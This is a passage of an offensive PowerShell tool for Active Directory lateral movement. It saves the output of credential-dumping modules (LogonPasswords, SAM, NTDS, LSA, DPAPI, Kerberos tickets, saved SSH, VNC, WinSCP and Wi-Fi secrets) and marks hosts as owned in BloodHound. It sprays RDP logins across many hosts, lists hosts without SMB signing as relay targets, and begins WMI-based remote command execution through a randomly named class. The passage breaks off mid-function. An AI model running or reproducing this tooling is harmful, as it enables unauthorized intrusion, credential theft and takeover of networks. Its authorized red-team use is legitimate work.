                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -ComputerOwned
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -UserName $Username `
                            -AdminToProperty
                        Continue
                    }
                    
                    elseif ($result -eq "Unable to connect") {}
                    
                    elseif ($result -match "[a-zA-Z0-9]") {
                        if ($result -eq "No Results") {
                            if ($successOnly) { continue }
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                                -OS $($runspace.OS) `
                                -statusColor "Yellow" `
                                -statusSymbol "[*] " `
                                -statusText "NO RESULTS" `
                                -NameLength $NameLength `
                                -OSLength $OSLength
                            Continue
                        }
                        else {
                            $Global:SuccessCount++
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                                -OS $($runspace.OS) `
                                -statusColor "Green" `
                                -statusSymbol "[+] " `
                                -statusText "SUCCESS" `
                                -NameLength $NameLength `
                                -OSLength $OSLength
                            Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                                -Domain $Domain `
                                -ComputerOwned
                            Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                                -Domain $Domain `
                                -UserName $Username `
                                -AdminToProperty

                            $filePath = switch ($Module) {
                                "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                                "DPAPI" { "$DPAPI\$($runspace.ComputerName)-DPAPI.txt" }
                                "eKeys" { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                                "FileZilla" { "$FileZilla\$($runspace.ComputerName)-FileZilla.txt" }
                                "Files" { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                                "KerbDump" { "$Tickets\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                                "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                                "LSA" { "$LSADump\$($runspace.ComputerName)-LSA.txt" }
                                "LSA-Trust" { "$LSATrust\$($runspace.ComputerName)-Trust.txt" }
                                "MDF" { "$MDF\$($runspace.ComputerName)-MDF.txt" }
                                "NTDS" { "$DCSyncFullDump\$($runspace.ComputerName)-NTDS.txt" }
                                "NTLM" { "$NTLM\$($runspace.ComputerName)-NTLM.txt" }
                                "Notepad" { "$Notepad\$($runspace.ComputerName)-Notepad.txt" }
                                "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                                "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                "SessionExec" { "$SessionExec\$($runspace.ComputerName)-SessionExec.txt" }
                                "SessionRelay" { "$SessionRelay\$($runspace.ComputerName)-SessionRelay.txt" }
                                "SSH" { "$SSH\$($runspace.ComputerName)-SSH.txt" }
                                "TGTDeleg" { "$TGTDeleg\$($runspace.ComputerName)-TGTDeleg.txt" }
                                "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                                "VNC" { "$VNCDump\$($runspace.ComputerName)-VNC.txt" }
                                "Wifi" { "$Wifi\$($runspace.ComputerName)-Wifi.txt" }
                                "WinSCP" { "$WinSCP\$($runspace.ComputerName)-WinSCP.txt" }
                                default { $null }
                            }

                            if ($filePath) {
                                $result | Out-File -FilePath $filePath -Encoding "ASCII"

                                if ($ShowOutput) {
                                    $result | Write-Output
                                    Write-Output ""
                                    $hasDisplayedResult = $true
                                }
                            }

                            # Handle the default case.
                            if (-not $Module -and -not $hasDisplayedResult) {
                                $result | Write-Output
                                Write-Output ""
                                $hasDisplayedResult = $true
                            }
                        }
                    }
                    elseif ($result -notmatch "[a-zA-Z0-9]") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -ComputerOwned
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) `
                            -Domain $Domain `
                            -UserName $Username `
                            -AdminToProperty
                        Continue
                    }

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })


        $runspacePool.Close()
        $runspacePool.Dispose()

    }

    ################################################################################################################
    ################################################# Function: RDP ################################################
    ################################################################################################################
   
    Function Method-RDP {
        $ErrorActionPreference = "SilentlyContinue"
        Write-Host

        $MaxConcurrentJobs = $Threads
        $RDPJobs = @()

        # Setting up runspaces for Port Checking
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, 4) # Need to test the threads at scale more
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $RunSpaceScriptBlock = {
            param ($computerName, $Timeout)
    
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 3389, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            $tcpClient.Close()
            if ($connected) { return "Connected" }
            else { return "Unable to connect" }
        }

        foreach ($computer in [array]$Computers) {
    
            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = $Computer
                $OS = "OS:PLACEHOLDER"
            }
    
            $runspace = [powershell]::Create().AddScript($RunSpaceScriptBlock).AddArgument($ComputerName).AddArgument($Timeout)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        $FailedComputers = @()

        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)

                    if ($result -eq "Unable to connect") {
                        $FailedComputers += $runspace.ComputerName
                        continue
                    }
           
                    # Cleanup for completed runspaces
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })

        # Final cleanup
        $runspacePool.Close()
        $runspacePool.Dispose()

        foreach ($Computer in [array]$Computers) {
    
            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }

            # Check if the computer is in the FailedComputers list
            if ($ComputerName -in $FailedComputers) { continue }

            $ScriptBlock = {

                Param($OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth, $SuccessOnly, $Global:irdp, $IPAddress, $RDP, $BloodHound)
                Invoke-Expression -Command $Global:irdp

                function Resolve-DnsNameWithTimeout {
                    param(
                        [string]$IPAddress,
                        [int]$Timeout
                    )
                    try {
                        $timeoutTask = [timespan]::FromMilliseconds($Timeout)
                        $task = [System.Net.Dns]::GetHostEntryAsync($IPAddress)

                        $sw = [System.Diagnostics.Stopwatch]::StartNew()

                        if ($task.Wait($timeoutTask)) {
                            $sw.Stop() # Stop the stopwatch
                            Write-Host ("{0,-44}" -f $($task.Result.HostName)) -NoNewline
                        }
                        else {
                            $sw.Stop()
                            Write-Host ("{0,-44}" -f "") -NoNewline
                        }
                    }
                    catch {
                        Write-Host ("{0,-44}" -f "") -NoNewline
                    } 
                }

                function Display-ComputerStatus {
                    param (
                        [string]$ComputerName,
                        [string]$OS,
                        [System.ConsoleColor]$statusColor = 'White',
                        [string]$statusSymbol = "",
                        [string]$statusText = "",
                        [int]$NameLength,
                        [int]$OSLength
                    )

                    # Prefix
                    Write-Host "RDP " -ForegroundColor "Yellow" -NoNewline
                    Write-Host "   " -NoNewline
     
                    if (!$IPAddress) {
                        # Resolve IP
                        $IP = $null
                        $Ping = New-Object System.Net.NetworkInformation.Ping
                        $Result = $Ping.Send($ComputerName, 15)
                        if ($Result.Status -eq 'Success') {
                            $IP = $Result.Address.IPAddressToString
                            Write-Host ("{0,-16}" -f $IP) -NoNewline
                        }
                        else {
                            Write-Host ("{0,-16}" -f $IP) -NoNewline
                        }
                    }
                    elseif ($IPAddress) {
                        Resolve-DnsNameWithTimeout -IPAddress $ComputerName -Timeout 5000
                    }

                    # IP Address in use, display nothing in column
                    else {}

                    # Display ComputerName and OS
                    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
                    Write-Host "   " -NoNewline
                    if (!$IPAddress) { Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline }
                    Write-Host "   " -NoNewline

                    # Display status symbol and text
                    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
                    Write-Host $statusText
                }

                function Append-BHQueryRDP {
                    param(
                        [Parameter(Mandatory = $true)]
                        [string]$ComputerName,
                        [Parameter(Mandatory = $true)]
                        [string]$Username,
                        [Parameter(Mandatory = $true)]
                        [string]$Domain
                    )

                    if ($LocalAuth) { return }

                    try {
                        $Domain = $Domain.ToUpper()
                        $ComputerName = $ComputerName.Split('.')[0].ToUpper()
                        $Username = $Username.ToUpper()
                        $filePath = "$BloodHound\Query.txt"

                        $fileContent = if (Test-Path -Path $filePath) { Get-Content -Path $filePath -Raw } else { "" }


                        Set-Content -Path $filePath -Value $initialContent

                        $RDPEntry = "{rdpusername: ""$Username@$Domain"", rdpcomputername: ""$ComputerName.$Domain""}"
                        if (-not $fileContent.Contains($RDPEntry)) {
                            $fileContent = $fileContent -replace "(?<=FOREACH \(RDPitem IN \[)(.*)(?=\] \|)", "`$1, $RDPEntry"
                            Set-Content -Path $filePath -Value $fileContent
                        }

                    }
                    catch {}
                }



                [int]$Global:SuccessCount = 0
                if ($LocalAuth) { $Domain = $ComputerName }
                if ($Password -ne "") { $result = Invoke-RDP "username=$Domain\$Username password=$Password computername=$ComputerName" }
           
                try { $result = $result.Trim() } catch {}

                $SuccessStatus = @(
                    'Success',
                    'STATUS_PASSWORD_MUST_CHANGE',
                    'LOGON_FAILED_UPDATE_PASSWORD',
                    'ARBITRATION_CODE_BUMP_OPTIONS',
                    'ARBITRATION_CODE_CONTINUE_LOGON',
                    'ARBITRATION_CODE_CONTINUE_TERMINATE',
                    'ARBITRATION_CODE_NOPERM_DIALOG',
                    'ARBITRATION_CODE_REFUSED_DIALOG',
                    'ARBITRATION_CODE_RECONN_OPTIONS'
                )

                $DeniedStatus = @(
                    'ERROR_CODE_ACCESS_DENIED',
                    'LOGON_FAILED_BAD_PASSWORD',
                    'LOGON_FAILED_OTHER',
                    'LOGON_WARNING',
                    'STATUS_LOGON_FAILURE',
                    'SSL_ERR_LOGON_FAILURE',
                    'disconnectReasonByServer',
                    'disconnectReasonRemoteByUser'
                )

                $PwChangeStatus = @('SSL_ERR_PASSWORD_MUST_CHANGE')
                $ToDStatus = @('STATUS_ACCOUNT_RESTRICTION')

                switch ($result) {
                    "Unable to connect" {
                        continue
                    }
                    { $SuccessStatus -contains $_ } {
                        $SuccessCount++
                        Display-ComputerStatus -ComputerName $ComputerName `
                            -OS $OS `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS" `
                            -NameLength $NameLength `
                            -OSLength $OSLength

                        if ($LocalAuth) {
                            $Username = "$Username (Local Account)"
                        }
                        if (-not (Test-Path -Path "$RDP\$Username.txt")) {
                            New-Item -Path "$RDP\$Username.txt" -ItemType "File" -Force | Out-Null
                        }
                        $ComputerName | Out-File -FilePath "$RDP\$Username.txt" -Encoding ASCII -Append
                        Append-BHQueryRDP -ComputerName $ComputerName -Username $Username -Domain $Domain
                        continue
                    }
                    { $DeniedStatus -contains $_ } {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus -ComputerName $ComputerName `
                            -OS $OS `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "ACCESS DENIED" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                    { $PwChangeStatus -contains $_ } {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus -ComputerName $ComputerName `
                            -OS $OS `
                            -statusColor "Magenta" `
                            -statusSymbol "[/] " `
                            -statusText "PASSWORD CHANGE REQUIRED" `
                            -NameLength $NameLength `
                            -OSLength $OSLength

                        if ($LocalAuth) {
                            $Username = "$Username (Local Account)"
                        }
                        if (-not (Test-Path -Path "$RDP\$Username.txt")) {
                            New-Item -Path "$RDP\$Username.txt" -ItemType "File" -Force | Out-Null
                        }
        ($ComputerName + "(Password Change Required)") | Out-File -FilePath "$RDP\$Username.txt" -Encoding ASCII -Append
                        Append-BHQueryRDP -ComputerName $ComputerName -Username $Username -Domain $Domain
                        continue
                    }
                    { $ToDStatus -contains $_ } {
                        $SuccessCount++
                        Display-ComputerStatus -ComputerName $ComputerName `
                            -OS $OS `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SUCCESS - ACCOUNT RESTRICTION" `
                            -NameLength $NameLength `
                            -OSLength $OSLength

                        if ($LocalAuth) {
                            $Username = "$Username (Local Account)"
                        }
                        if (-not (Test-Path -Path "$RDP\$Username.txt")) {
                            New-Item -Path "$RDP\$Username.txt" -ItemType "File" -Force | Out-Null
                        }
        ($ComputerName + "(Account Restriction)") | Out-File -FilePath "$RDP\$Username.txt" -Encoding ASCII -Append
                        Append-BHQueryRDP -ComputerName $ComputerName -Username $Username -Domain $Domain
                        continue
                    }
                    default {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus -ComputerName $ComputerName `
                            -OS $OS `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "$_" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }
                }

   

            }

            while (($RDPJobs | Where-Object { $_.State -eq 'Running' }).Count -ge $MaxConcurrentJobs) {
                Start-Sleep -Milliseconds 100
            }

            # Start the job
            $RDPJob = Start-Job -ScriptBlock $ScriptBlock -ArgumentList $OS, $ComputerName, $Domain, $Username, $Password, $NameLength, $OSLength, $LocalAuth, $SuccessOnly, $Global:irdp, $IPAddress, $RDP, $BloodHound
            [array]$RDPJobs += $RDPJob
        }

        # Monitor and manage jobs, terminate any that run longer than 120 seconds (Assume hung)
        do {
            foreach ($Job in $RDPJobs) {
                if ($Job.State -eq 'Running') {
                    $runtime = (Get-Date) - $Job.PSBeginTime
                    if ($runtime.TotalSeconds -gt 120) {
                        Stop-Job -Job $Job -Force
                        Remove-Job -Job $Job -Force
                        $RDPJobs = $RDPJobs | Where-Object { $_.Id -ne $Job.Id }
                    }
                }
                elseif ($Job.State -eq 'Completed') {
                    $Result = Receive-Job -Job $Job
                    $Result
                    Remove-Job -Job $Job -Force
                    $RDPJobs = $RDPJobs | Where-Object { $_.Id -ne $Job.Id }
                }
            }
            Start-Sleep -Milliseconds 100
        } while ($RDPJobs.Count -gt 0)

        # Final cleanup for any lingering jobs (should be none at this point)
        $RDPJobs | Remove-Job -Force -ErrorAction SilentlyContinue

        if (Test-Path -Path "$RDP\$Username.txt") {
            Get-Content -Path "$RDP\$Username.txt" | Select-Object -Unique | Set-Content -Path "$RDP\$Username.txt"
        }
    }

    ################################################################################################################
    ############################################# Function: GenRelayList ###########################################
    ################################################################################################################

    Function GenRelayList {
        Write-output ""

        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($computerName, $Command, $Timeout)

            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            if (!$connected) { return "Unable to connect" ; $tcpClient.Close() }   

            # Code is a revision from: https://github.com/tmenochet/PowerScan/blob/master/Recon/Get-SmbStatus.ps1
            Function Get-SMBSigning {
                Param ([string]$ComputerName, $Timeout)

                $SMB1 = Get-SmbVersionStatus -ComputerName $ComputerName -SmbVersion 'SMB1' -Timeout $Timeout
                $SMB2 = Get-SmbVersionStatus -ComputerName $ComputerName -SmbVersion 'SMB2' -Timeout $Timeout

                if ($SMB1.SigningStatus -or $SMB2.SigningStatus) { "Signing Required" } else { "Signing not Required" }
            }

            function ConvertFrom-PacketOrderedDictionary ($packet_ordered_dictionary) {
                $byte_array = @()
                foreach ($field in $packet_ordered_dictionary.Values) {
                    $byte_array += $field
                }
                return $byte_array
            }

            function Get-PacketNetBIOSSessionService {
                Param (
                    [Int] $packet_header_length,
                    [Int] $packet_data_length
                )

                [Byte[]] $packet_netbios_session_service_length = [BitConverter]::GetBytes($packet_header_length + $packet_data_length)
                $packet_NetBIOS_session_service_length = $packet_netbios_session_service_length[2..0]
                $packet_NetBIOSSessionService = New-Object Collections.Specialized.OrderedDictionary
                $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Message_Type", [Byte[]](0x00))
                $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Length", $packet_netbios_session_service_length)
                return $packet_NetBIOSSessionService
            }

            function Get-PacketSMBHeader {
                Param (
                    [Byte[]] $packet_command,
                    [Byte[]] $packet_flags,
                    [Byte[]] $packet_flags2,
                    [Byte[]] $packet_tree_ID,
                    [Byte[]] $packet_process_ID,
                    [Byte[]] $packet_user_ID
                )

                $packet_SMBHeader = New-Object Collections.Specialized.OrderedDictionary
                $packet_SMBHeader.Add("SMBHeader_Protocol", [Byte[]](0xff, 0x53, 0x4d, 0x42))
                $packet_SMBHeader.Add("SMBHeader_Command", $packet_command)
                $packet_SMBHeader.Add("SMBHeader_ErrorClass", [Byte[]](0x00))
                $packet_SMBHeader.Add("SMBHeader_Reserved", [Byte[]](0x00))
                $packet_SMBHeader.Add("SMBHeader_ErrorCode", [Byte[]](0x00, 0x00))
                $packet_SMBHeader.Add("SMBHeader_Flags", $packet_flags)
                $packet_SMBHeader.Add("SMBHeader_Flags2", $packet_flags2)
                $packet_SMBHeader.Add("SMBHeader_ProcessIDHigh", [Byte[]](0x00, 0x00))
                $packet_SMBHeader.Add("SMBHeader_Signature", [Byte[]](0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00))
                $packet_SMBHeader.Add("SMBHeader_Reserved2", [Byte[]](0x00, 0x00))
                $packet_SMBHeader.Add("SMBHeader_TreeID", $packet_tree_ID)
                $packet_SMBHeader.Add("SMBHeader_ProcessID", $packet_process_ID)
                $packet_SMBHeader.Add("SMBHeader_UserID", $packet_user_ID)
                $packet_SMBHeader.Add("SMBHeader_MultiplexID", [Byte[]](0x00, 0x00))
                return $packet_SMBHeader
            }

            function Get-PacketSMBNegotiateProtocolRequest ($packet_version) {
                if ($packet_version -eq 'SMB1') {
                    [Byte[]] $packet_byte_count = 0x0c, 0x00
                }
                else {
                    [Byte[]] $packet_byte_count = 0x22, 0x00
                }
                $packet_SMBNegotiateProtocolRequest = New-Object Collections.Specialized.OrderedDictionary
                $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_WordCount", [Byte[]](0x00))
                $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_ByteCount", $packet_byte_count)
                $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat", [Byte[]](0x02))
                $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name", [Byte[]](0x4e, 0x54, 0x20, 0x4c, 0x4d, 0x20, 0x30, 0x2e, 0x31, 0x32, 0x00))
                if ($packet_version -ne 'SMB1') {
                    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat2", [Byte[]](0x02))
                    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name2", [Byte[]](0x53, 0x4d, 0x42, 0x20, 0x32, 0x2e, 0x30, 0x30, 0x32, 0x00))
                    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat3", [Byte[]](0x02))
                    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name3", [Byte[]](0x53, 0x4d, 0x42, 0x20, 0x32, 0x2e, 0x3f, 0x3f, 0x3f, 0x00))
                }
                return $packet_SMBNegotiateProtocolRequest
            }

            function Get-SmbVersionStatus {
                Param (
                    [string] $ComputerName,
                    [string] $SmbVersion = 'SMB2',
                    $Timeout
                )

                #$serviceStatus = $false
                #$versionStatus = $false
                $signingStatus = $false

                $process_ID = [Diagnostics.Process]::GetCurrentProcess() | Select-Object -ExpandProperty Id
                $process_ID = [BitConverter]::ToString([BitConverter]::GetBytes($process_ID))
                $process_ID = $process_ID.Replace("-00-00", "")
                [Byte[]] $process_ID_bytes = $process_ID.Split("-") | ForEach-Object { [Char][Convert]::ToInt16($_, 16) }

                $tcpClient = New-Object System.Net.Sockets.TcpClient
                $tcpClient.ReceiveTimeout = $Timeout

                try {
                    $tcpClient.Connect($ComputerName, "445")
                    if ($tcpClient.connected) {
                        $serviceStatus = $true

                        $SMB_relay_challenge_stream = $tcpClient.GetStream()
                        $SMB_client_receive = New-Object Byte[] 1024
                        $SMB_client_stage = 'NegotiateSMB'

                        while ($SMB_client_stage -ne 'exit') {
                            switch ($SMB_client_stage) {
                                'NegotiateSMB' {
                                    $packet_SMB_header = Get-PacketSMBHeader 0x72 0x18 0x01, 0x48 0xff, 0xff $process_ID_bytes 0x00, 0x00
                                    $packet_SMB_data = Get-PacketSMBNegotiateProtocolRequest $SmbVersion
                                    $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                                    $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                                    $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                                    $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                                    $SMB_client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                                    $SMB_relay_challenge_stream.Write($SMB_client_send, 0, $SMB_client_send.Length) > $null
                                    $SMB_relay_challenge_stream.Flush()
                                    $SMB_relay_challenge_stream.Read($SMB_client_receive, 0, $SMB_client_receive.Length) > $null
                                    if ([BitConverter]::ToString($SMB_client_receive[4..7]) -eq 'ff-53-4d-42') {
                                        $SmbVersion = 'SMB1'
                                        $SMB_client_stage = 'NTLMSSPNegotiate'
                                    }
                                    else {
                                        $SMB_client_stage = 'NegotiateSMB2'
                                    }
                                    if (($SmbVersion -eq 'SMB1' -and [BitConverter]::ToString($SMB_client_receive[39]) -eq '0f') -or ($SmbVersion -ne 'SMB1' -and [BitConverter]::ToString($SMB_client_receive[70]) -eq '03')) {
                                        $signingStatus = $true
                                    }
                                    $tcpClient.Close()
                                    $SMB_client_receive = $null
                                    $SMB_client_stage = 'exit'
                                    #$versionStatus = $true
                                }
                            }
                        }
                    }
                }
    
                catch { return "Unable to connect" }
                finally { $tcpClient.Close() }
                return ([PSCustomObject]@{SigningStatus = $signingStatus })
            }

            return Get-SMBSigning -ComputerName $ComputerName

        }

        # Create and invoke runspaces for each computer
        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }
    
            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        [int]$Global:SuccessCount = 0
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                    $hasDisplayedResult = $false

                    try {
                        $result = $result.Trim()
                    }
                    catch {}

                    if ($Result -eq "Unable to connect") {
                        $runspace.Runspace.Dispose()
                        $runspace.Handle.AsyncWaitHandle.Close()
                        continue
                    }

                    if ($result -match "Signing Required") {
                        if ($SuccessOnly) {
                            continue
                        }
                        else {
                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                                -OS $($runspace.OS) `
                                -statusColor "Red" `
                                -statusSymbol "[-] " `
                                -statusText "SMB Signing Required" `
                                -NameLength $NameLength `
                                -OSLength $OSLength
                            continue
                        }
                    }
                    elseif ($result -match "Signing not Required") {
                        $Global:SuccessCount++
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Green" `
                            -statusSymbol "[+] " `
                            -statusText "SMB Signing not Required" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        $($runspace.ComputerName) | Out-File "$SMB\SigningNotRequired-$Domain.txt" `
                            -Encoding "ASCII" `
                            -Append `
                            -Force `
                            -ErrorAction "SilentlyContinue"
                        continue
                    }
                    else {
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Yellow" `
                            -statusSymbol "[*] " `
                            -statusText "ERROR" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        continue
                    }

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }
            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })


        # Check if the file exists
        if (Test-Path "$SMB\SigningNotRequired-$Domain.txt") {
            $Unique = Get-Content "$SMB\SigningNotRequired-$Domain.txt" | Sort-Object -Unique
            $Unique | Set-Content "$SMB\SigningNotRequired-$Domain.txt" -Force
        } 

        $runspacePool.Close()
        $runspacePool.Dispose()
 
    }

    ################################################################################################################
    ############################################ Function: SessionHunter ###########################################
    ################################################################################################################
    Function Method-SessionHunter {
        Write-host

        Remove-Item -Path "$Sessions\SH-MatchedGroups-$Domain.txt" -Force -ErrorAction "SilentlyContinue"

        # Create a runspace pool
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($computerName, $Command, $Timeout)

            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            $tcpClient.Close()
            if (!$connected) { return }
    
            $osInfo = $null
            $osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue"
            if (!$osInfo) { return }

            Function WMI {
                param (
                    [string]$ComputerName,
                    [string]$Command,
                    [string]$Class = "Win32_" + -join ((65..90 + 97..122 + 48..57) | Get-Random -Count 16 | ForEach-Object { [char]$_ }),
                    [switch]$LocalAuth,
                    [string]$Username,
                    [string]$Password
                )

                # Create PSCredential object if using local authentication
                if ($LocalAuth) {
                    $LocalUsername = "$ComputerName\$Username"
                    $LocalPassword = ConvertTo-SecureString "$Password" -AsPlainText -Force
                    $cred = New-Object System.Management.Automation.PSCredential($LocalUsername, $LocalPassword)
                }

                $WMIAccess = $null
                if ($LocalAuth) { $WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" -Credential $cred } 
                else { $WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" }

                if (!$WMIAccess) { return "Access Denied" } 
                elseif ($Command -eq "") { return "Successful Connection PME" }

                function Invoke-Class {
                    param (
                        [string]$ComputerName
                    )

                    if ($LocalAuth) { $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $cred }
                    else { $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" }

                    if ($classCheck -eq $null) {
                        if ($LocalAuth) {
                            $scope = New-Object System.Management.ManagementScope("\\$ComputerName\root\cimv2", (New-Object System.Management.ConnectionOptions -Property @{ Username = "$Computername\$Username"; Password = $Password }))
                            $scope.Connect()
                            $newClass = New-Object System.Management.ManagementClass($scope, [System.Management.ManagementPath]::DefaultPath, $null)
                        }
                        else { $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2", [string]::Empty, $null) }

                        $newClass["__CLASS"] = "$Class"
                        $newClass.Qualifiers.Add("Static", $true)
                        $newClass.Properties.Add("InstanceID", [System.Management.CimType]::String, $false)
                        $newClass.Properties["InstanceID"].Qualifiers.Add("Key", $true)
                        $newClass.Properties.Add("CommandOutput", [System.Management.CimType]::String, $false)
